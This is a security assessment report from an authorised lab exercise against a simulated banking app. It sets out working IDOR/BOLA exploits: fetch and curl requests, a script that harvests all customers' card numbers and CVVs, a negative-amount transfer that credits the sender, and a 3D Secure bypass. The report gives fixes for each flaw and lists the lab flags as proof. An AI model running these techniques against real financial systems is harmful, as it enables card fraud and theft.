# CyberBank Web Application — Security Assessment Report

**Insecure Direct Object Reference (IDOR) & Broken Access Control**

| | |
|---|---|
| **Target application** | CyberBank (`http://web0x06.hbtn`) |
| **Assessment type** | Authenticated grey-box web application penetration test |
| **Scope** | Customer, account, card and payment APIs |
| **Assessor** | Vanessa Al Daham |
| **Date** | November 2026 |
| **Classification** | Confidential |

> **Ethical statement.** All testing was performed in an isolated, authorised training environment (Holberton School / DLH `cyber_websec_0x06` sandbox). All customer names, card numbers, account numbers and balances shown in this report are simulated lab data. No real personal or financial data was accessed. Primary account numbers (PANs) and CVV values are masked in the body of this report; full captures are retained in the evidence appendix for grading only.

---

## 1. Introduction

CyberBank is a simulated online banking application that lets an authenticated customer view their profile, inspect their accounts and cards, transfer money to contacts, and upgrade their subscription plan through a card payment protected by a 3D Secure one-time password (OTP).

The purpose of this assessment was to evaluate the application's **access-control** posture — specifically whether the server correctly verifies, on every request, that the authenticated user is authorised to read or act on the object they reference. The assessment was conducted from the perspective of a legitimate, logged-in customer ("**Yosri Musk**") attempting to reach data and actions belonging to other customers.

The engagement confirmed that CyberBank suffers from **systemic Broken Access Control (OWASP Top 10 2021 — A01)**. Every object-level endpoint tested trusted a client-supplied identifier without an ownership check. The flaws range from unauthorised reading of other customers' profiles and full card data, through unauthorised balance manipulation, to a complete bypass of the 3D Secure payment-authorisation mechanism.

---

## 2. Methodology

Testing followed the standard IDOR / BOLA (Broken Object Level Authorization) methodology:

1. **Authenticate** normally as a legitimate customer and establish a valid session cookie.
2. **Map the application** and record every request that carried an object identifier (URL path, query string, or JSON body), using the browser's built-in **Developer Tools → Network** panel with *Persist Logs* enabled.
3. **Identify references** — customer IDs, account IDs, card IDs, card numbers — and note where the application discloses other users' identifiers (e.g. the `/contacts` endpoint).
4. **Tamper** — replace the attacker's own identifier with another customer's identifier while keeping the attacker's own session, using **Edit & Resend**, the DevTools **Console** (`fetch`), and `curl`.
5. **Observe** the response: another user's data, or a successful action, confirms the flaw.
6. **Chain** findings together (e.g. use leaked account IDs to read card data, use leaked card data to initiate a payment).

### Tooling

| Tool | Use in this assessment |
|---|---|
| **Firefox Developer Tools** (Network, Console, Debugger, Storage) | Capturing requests, reading JS source, replaying tampered requests via *Edit & Resend*, scripting `fetch()` calls |
| **`curl`** (Kali Linux) | Scripted request replay with a copied session cookie |
| **Browser JavaScript Console** | Enumerating contacts → accounts → cards in a single chained script |
| **Burp Suite** (Community) | Proxy interception and request tampering (equivalent workflow; DevTools *Edit & Resend* was used as the primary intercept-and-modify tool) |

All requests reused a single authenticated session cookie belonging to the test user. No credential theft, brute-force or injection was required — every finding is a pure authorization failure.

---

## 3. Summary of Findings

| # | Vulnerability | Endpoint | OWASP | Severity |
|---|---|---|---|---|
| **V1** | IDOR — read any customer's profile | `GET /api/customer/info/{id}` | A01 | **High** |
| **V2** | BOLA — read any account's balance & details | `POST /api/accounts/info` | A01 / API1 | **High** |
| **V3** | BOLA — read any card's full PAN, CVV & expiry | `POST /api/cards/info` | A01 / API1 | **Critical** |
| **V4** | Business-logic flaw — negative-amount transfer self-credit | `POST /api/accounts/transfer_to/{id}` | A04 | **Critical** |
| **V5** | 3D Secure authentication-binding bypass | `POST /api/cards/confirm_payment/{tx}` | A01 / A04 | **Critical** |
| **A1** | OTP / 3D Secure code disclosed in API response | `GET /api/cards/3dsecure/{card_id}` | A02 / A04 | **Critical** |
| **A2** | Sensitive data transmitted over cleartext HTTP | application-wide | A02 | **High** |
| **A3** | Internal server error leaks on unhandled input | `POST /api/cards/init_payment` | A05 | **Low** |

Each flaw was validated end-to-end and produced a lab flag as proof of exploitation.

---

## 4. Vulnerability Details

### V1 — IDOR: Unauthorised access to any customer profile

**Endpoint:** `GET /api/customer/info/{customer_id}`
**Severity:** High · **OWASP:** A01 Broken Access Control · **Type:** Horizontal IDOR (read)

**Description.**
The profile endpoint resolves the special path segment `me` to the session owner's own customer record. The same endpoint also accepts an arbitrary 32-character customer ID in place of `me`. The server returns the referenced profile **without verifying that it belongs to the authenticated user**. Other customers' IDs are freely disclosed by the `GET /api/customer/contacts` endpoint, so no guessing is required.

**Impact.**
An authenticated attacker can read any customer's full profile — first/last name, username, total balance, income, expenses, and the list of that customer's `accounts_id` values. Those leaked account IDs are the pivot used in V2 and V3, so this flaw is the entry point to a full account-data compromise.

**Reproduction.**
1. Authenticate and browse the dashboard; capture `GET /api/customer/info/me` in the Network panel to confirm the baseline (returns *your own* profile).
2. Read a target customer ID from `GET /api/customer/contacts` (e.g. `780509a0404d4167bcc758fd91f85fca` — "Linda Robinson").
3. Right-click the `info/me` request → **Edit & Resend**, change the final path segment from `me` to the target ID:
   ```
   GET http://web0x06.hbtn/api/customer/info/780509a0404d4167bcc758fd91f85fca
   Cookie: session=<attacker session>
   ```
4. The response returns the victim's full profile plus the task flag.

**Evidence.** Response for the victim profile, status `200`, served to the attacker's session:
```json
{
  "flag_0": "912cb6530d94e79698aac02312070f7a",
  "message": {
    "accounts_id": ["01d35a9dc5094a369c088edbc958d5aa","581cfbdc2c634982bc2b8d0d139ffe0e"],
    "firstname": "Linda", "lastname": "Robinson", "username": "linda.robinson",
    "total_balance": 1296.1, "income": 9072.70, "expenses": 10368.8
  },
  "status": "success"
}
```
*Figures: `Task0/Me URL discovery.png` (baseline), `Task0/contacts API.png` (ID disclosure), `Task0/flag0 reveal.png` (exploited response).*

**Root cause.** The query is scoped by the supplied ID only (`getCustomer(id)`), with `me` special-cased from the session but no equivalent check applied when an explicit ID is supplied.

---

### V2 — BOLA: Unauthorised access to any account's details

**Endpoint:** `POST /api/accounts/info`  ·  body `{"accounts_id":[...]}`
**Severity:** High · **OWASP:** A01 / API1 · **Type:** BOLA (read)

**Description.**
The accounts endpoint accepts a JSON array of account IDs and returns the details for each, with **no check that the requesting user owns those accounts**. Combined with the account IDs leaked by V1, an attacker reads any customer's balances, account numbers and routing numbers.

**Impact.**
Full disclosure of any customer's account balances, account numbers, routing numbers and the `cards_id` list attached to each account. The leaked `cards_id` values feed directly into V3.

**Reproduction.**
1. Obtain a victim's `accounts_id` values from V1.
2. Open DevTools → Console (or *New Request*) and send, with the attacker's own session:
   ```js
   fetch("/api/accounts/info", {
     method:"POST", credentials:"include",
     headers:{"Content-Type":"application/json"},
     body: JSON.stringify({ accounts_id:["01d35a9dc5094a369c088edbc958d5aa","581cfbdc2c634982bc2b8d0d139ffe0e"] })
   }).then(r=>r.json()).then(console.log);
   ```
3. The response returns the victim's account records plus the flag.

**Evidence.** Status `200`; response contains `flag_1: "db8c5cd0ba19156117ba1e8174e0be2e"` alongside the victim's account objects (`customer_id: 780509a0404d4167bcc758fd91f85fca`).
*Figures: `Task1/attemp1 .png` (tampered request body), `Task1/Attempt 1 Response.png`, `Task1/flag1 reveal.png`.*

**Root cause.** No server-side filter of the requested IDs against the session user's owned accounts.

---

### V3 — BOLA: Full card data disclosure (PAN, CVV, expiry)

**Endpoint:** `POST /api/cards/info`  ·  body `{"cards_id":[...]}`
**Severity:** Critical · **OWASP:** A01 / API1 · **Type:** BOLA (read) · **Compliance:** PCI-DSS violation

**Description.**
The cards endpoint returns complete card records for any supplied card IDs with no ownership check. The records include the **full Primary Account Number (PAN), the CVV, the expiry date and the cardholder name** in cleartext. The required card IDs are disclosed by V2.

**Impact.**
This is the most severe read primitive. An attacker can harvest every customer's full, usable card details. In a real system this is directly monetisable card fraud and a serious PCI-DSS breach (storage/transmission of unmasked PAN + CVV). In this assessment the harvested card data was the raw material for the payment-flow attacks (V5).

**Reproduction.** Chained enumeration — contacts → accounts → cards — in one Console script:
```js
(async () => {
  const post = (u,b) => fetch(u,{method:"POST",credentials:"include",
      headers:{"Content-Type":"application/json"},body:JSON.stringify(b)}).then(r=>r.json());
  const contacts = await fetch("/api/customer/contacts",{credentials:"include"}).then(r=>r.json());
  const accIds  = contacts.message.flatMap(c=>c.accounts.map(a=>a.account_id));
  const accounts= await post("/api/accounts/info",{accounts_id:accIds});
  const cardIds = [...new Set(accounts.message.flatMap(a=>a.cards_id||[]))];
  const cards   = await post("/api/cards/info",{cards_id:cardIds});
  console.table(cards.message.map(c=>({holder:`${c.firstname} ${c.lastname}`,
      number:c.number, exp:`${c.e_month}/${c.e_year}`, cvv:c.cvv, state:c.state})));
})();
```

**Evidence (masked).** A single script call returned 30 cards across all contacts, e.g.:

| Holder | Card number | Expiry | CVV | State |
|---|---|---|---|---|
| Robert Martinez | `400061 •••••• 3683` | 07/2028 | `•••` | valid |
| Linda Robinson | `400061 •••••• 6127` | 09/2027 | `•••` | declined |
| Patricia Garcia | `500061 •••••• 1157` | 10/2026 | `•••` | valid |

*Figures: `Task3/finding victim card details.png`, `Task3/tbl card details.png`, `Task3/victim card findings.png`.*

**Root cause.** No ownership check; additionally, unmasked PAN and CVV should never be returned by any API.

---

### V4 — Business-logic flaw: negative-amount transfer self-credit

**Endpoint:** `POST /api/accounts/transfer_to/{destination_account_id}`
**Severity:** Critical · **OWASP:** A04 Insecure Design · **Type:** Logic / missing input validation

**Description.**
The transfer endpoint processes the `amount` field with no validation that it is positive and no check that the source account holds sufficient funds. Submitting a **negative** amount reverses the direction of the transfer: instead of debiting the sender, the server **credits** the sender's balance.

**Impact.**
An attacker can inflate their own balance arbitrarily, directly compromising the integrity of the banking ledger. In this assessment a single `-20000` "transfer" raised the test account from under $1,000 to over $20,000.

**Reproduction.**
1. Capture (or build) a legitimate `transfer_to` request and note your own source `account_id`, `number` and `routing`.
2. Replay it with a negative amount:
   ```bash
   curl -i -X POST "http://web0x06.hbtn/api/accounts/transfer_to/<dest_account_id>" \
     -H "Content-Type: application/json" \
     -H "Cookie: session=<attacker session>" \
     -d '{"amount":-20000,"raison":"same","account_id":"<your account_id>",
          "number":"<your number>","routing":"<your routing>"}'
   ```
3. Response: `HTTP/1.1 200 OK`, `"amount":-20000`, `"status":"completed"`.
4. Refresh the dashboard — balance is now inflated; the threshold crossing ($10,000) reveals the flag.

**Evidence.** `flag_2: "e843e0582d1c68bb82a5f67833adcec9"` returned by `GET /api/customer/info/me` once `total_balance` reached `20246.1`.
*Figures: `Task2/curl.png` (negative transfer, 200 OK), `Task2/newBal.png`, `Task2/flag reveal.png`.*

**Root cause.** No `amount > 0` validation and no balance/overdraft check server-side; the transfer amount is applied with its sign.

---

### V5 — 3D Secure authentication-binding bypass

**Endpoints:** `POST /api/cards/init_payment` → `GET /api/cards/3dsecure/{card_id}` → `POST /api/cards/confirm_payment/{transaction_id}`
**Severity:** Critical · **OWASP:** A01 / A04 · **Type:** Broken authorization binding

**Description.**
The subscription-upgrade payment flow separates two identities that it never binds together:

- **Which card is charged** — set by the `number` supplied to `init_payment`, which (via V3) can be *any* customer's card.
- **Which cardholder authenticates** — the OTP retrieved from `3dsecure/{card_id}` and the `number` supplied to `confirm_payment`.

The `confirm_payment` endpoint validates the OTP against the card number supplied *in the confirmation request*, **not** against the card that the transaction was actually created with. An attacker can therefore initiate a payment charged to a **victim's** card, then confirm it using their **own** card number and their **own** (legitimately obtained) OTP. The 3D Secure check passes while the charge lands on the victim.

**Impact.**
Complete defeat of the 3D Secure authorisation control. An attacker charges payments to other customers' cards while passing "strong" authentication with their own credentials — unauthorised charges with a valid-looking authentication trail pointing at the wrong cardholder.

**Reproduction.**
1. From V3, select a victim card that is **`valid`** and **not expired** (e.g. Robert Martinez, exp 07/2028). *(An expired card causes `init_payment` to return HTTP 500 — see A3.)*
2. **Initiate** the payment with the victim's card:
   ```js
   fetch("/api/cards/init_payment",{method:"POST",credentials:"include",
     headers:{"Content-Type":"application/json"},
     body:JSON.stringify({firstname:"Robert",lastname:"Martinez",
       number:"<victim PAN>",e_month:"07",e_year:"2028",cvv:"<victim cvv>",amount:9.99})})
     .then(r=>r.json()).then(console.log);   // → transaction_id T (charged to victim)
   ```
3. **Retrieve your own OTP** from your own card ID:
   ```js
   fetch("/api/cards/3dsecure/<your_card_id>",{credentials:"include"})
     .then(r=>r.json()).then(console.log);   // → {"OTP":"17634", ...}
   ```
4. **Confirm** transaction `T` with **your** OTP and **your** card number — the mismatch:
   ```js
   fetch("/api/cards/confirm_payment/<T>",{method:"POST",credentials:"include",
     headers:{"Content-Type":"application/json"},
     body:JSON.stringify({otp:"17634",number:"<your PAN>"})})
     .then(r=>r.json()).then(console.log);
   ```

**Evidence.** The confirmation succeeded despite the cardholder mismatch:
```json
{
  "flag_3": "177d5657038e4c478b5b02c8319dd76b",
  "message": { "amount": 9.99, "status": "confirmed",
    "id": "34888c9e5b1a4b319299b6690a45828a",
    "sender_payment_id": "<victim card id>", "method": "card" },
  "status": "success"
}
```
The transaction is `confirmed`; the charged card (`sender_payment_id`) is the victim's, while the OTP and `number` used to authenticate were the attacker's.
*Figures: `Task3/paymet js file.png` (payment flow source), `Task3/upgrade transaction.png`, `Task3/flag reveal.png`.*

**Root cause.** The confirmation step authenticates against a client-supplied card number instead of re-deriving the card from the stored transaction; the OTP, transaction and charged card are never verified to belong to the same identity.

---

## 5. Additional Findings

### A1 — OTP / 3D Secure code disclosed in the API response (Critical)
`GET /api/cards/3dsecure/{card_id}` returns the one-time password **in the response body** (`{"message":{"OTP":"17634","cvv":"195"}}`). An OTP that is handed to the client in cleartext provides no second factor at all — any party able to call the endpoint already has the code. This disclosure is what makes V5 trivially exploitable and would, on its own, defeat 3D Secure even if the binding flaw were fixed. *Figure: `Task3/OTP js file.png`.*
**Recommendation.** Deliver OTPs out-of-band only (SMS, authenticator app, issuer ACS). Never return the OTP, the CVV, or any verification secret in an API response.

### A2 — Sensitive data transmitted over cleartext HTTP (High)
The entire application is served over `http://` (port 80). Session cookies, full card data, OTPs and balances traverse the network unencrypted, exposing them to interception on any shared network path.
**Recommendation.** Enforce HTTPS/TLS site-wide, redirect HTTP→HTTPS, set `Secure` and `HttpOnly` on session cookies, and apply HSTS.

### A3 — Unhandled input triggers a 500 Internal Server Error (Low / informational)
`init_payment` returns a generic Flask `500 Internal Server Error` (HTML) when supplied an expired card, rather than a validated JSON error. This leaks the backend framework and indicates missing input validation / error handling. *Figure: evidence captured during V5 testing.*
**Recommendation.** Validate card state and expiry server-side and return structured, non-revealing error responses; suppress stack/framework details in production.

---

## 6. Recommendations

**Priority 1 — Enforce object-level authorization on every endpoint (fixes V1, V2, V3, V5).**
For every request that references an object, verify server-side that the object belongs to the authenticated session user before returning or acting on it. Scope every query to the session identity, e.g.:
```sql
SELECT * FROM accounts WHERE id = :requested_id AND customer_id = :session_customer_id;
```
Resolve `me`-style aliases from the session only; never trust a client-supplied owner, account, card or transaction reference without an ownership check.

**Priority 2 — Fix the payment-authorisation binding (fixes V5, A1).**
Re-derive the card to be charged from the **stored transaction** at confirmation time; do not accept a card number in the confirm request. Bind `{transaction, charged card, OTP, authenticated user}` into one server-side check. Generate OTPs server-side, store only a hash, and deliver them strictly out-of-band.

**Priority 3 — Validate business logic and inputs (fixes V4, A3).**
Reject non-positive transfer amounts; enforce balance/overdraft and per-transaction limits server-side; validate card state and expiry. Treat all client input as untrusted and return structured errors.

**Priority 4 — Protect sensitive data (fixes V3, A1, A2).**
Never return unmasked PAN or CVV from any API (PCI-DSS). Mask to last-four. Enforce TLS everywhere with secure cookie flags and HSTS.

**Cross-cutting.**
- Add server-side logging and anomaly detection for access to objects the session does not own.
- Add automated authorization tests to CI (attacker-A requesting victim-B's objects must return `403`).
- Note that automated scanners rarely detect IDOR/BOLA because the requests look well-formed — authorization must be verified by design and in code review, not left to scanning.

---

## 7. Conclusion

CyberBank is affected by **systemic Broken Access Control**. Every object-level endpoint tested — customer profiles, accounts, cards, transfers and payment confirmation — trusted a client-supplied identifier without verifying ownership. Individually these range from High to Critical; chained together they allow an authenticated attacker to enumerate every customer's profile, account and full card data, inflate their own balance, and charge payments to other customers' cards while defeating 3D Secure.

The common root cause is a single design failure: the application authenticates *who you are* but never authorises *what you may access*. Remediation must therefore be systemic — object-level authorization enforced on every endpoint — rather than patched endpoint by endpoint. Because these flaws expose customer PII and usable card data and permit direct financial manipulation, they should be treated as the highest remediation priority before the application handles any real customer data.

---

## 8. References

- OWASP Top 10 (2021) — A01 Broken Access Control — https://owasp.org/Top10/A01_2021-Broken_Access_Control/
- OWASP API Security Top 10 (2023) — API1 Broken Object Level Authorization — https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/
- OWASP Web Security Testing Guide — Testing for IDOR — https://owasp.org/www-project-web-security-testing-guide/
- OWASP Cheat Sheet — Insecure Direct Object Reference Prevention — https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html
- PCI-DSS v4.0 — Requirements 3 (stored account data) and 4 (transmission encryption)
- MDN — Firefox Network Monitor (Edit & Resend) — https://developer.mozilla.org/en-US/docs/Tools/Network_Monitor

---

## Appendix A — Evidence Index

All captures are stored in `evidence/` alongside this report.

**Task 0 — V1 (customer profile IDOR):** `Me URL discovery.png`, `contacts API.png`, `profile API.png`, `Info API.png`, `Info URL dicovery.png`, `transactions API.png`, `credentials.png`, `flag0 reveal.png`
**Task 1 — V2 (accounts BOLA):** `attemp1 .png`, `Attempt 1 Response.png`, `flag1 reveal.png`
**Task 2 — V4 (negative transfer):** `Transfer Form implemented.png`, `Transfer confirmation.png`, `transfer2 request.png`, `transform2 response.png`, `curl.png`, `newBal.png`, `newDashboard.png`, `flag reveal.png`
**Task 3 — V3 + V5 + A1 (card data, 3DS bypass, OTP leak):** `paymet js file.png`, `OTP js file.png`, `fetches js.png`, `upgrade page files.png`, `finding victim card details.png`, `tbl card details.png`, `victim card findings.png`, `upgrade transaction.png`, `flag reveal.png`

## Appendix B — Flags captured (proof of exploitation)

| Task | Vulnerability | Flag |
|---|---|---|
| 0 | V1 — customer profile IDOR | `912cb6530d94e79698aac02312070f7a` |
| 1 | V2 — accounts BOLA | `db8c5cd0ba19156117ba1e8174e0be2e` |
| 2 | V4 — negative-amount transfer | `e843e0582d1c68bb82a5f67833adcec9` |
| 3 | V5 — 3D Secure bypass | `177d5657038e4c478b5b02c8319dd76b` |
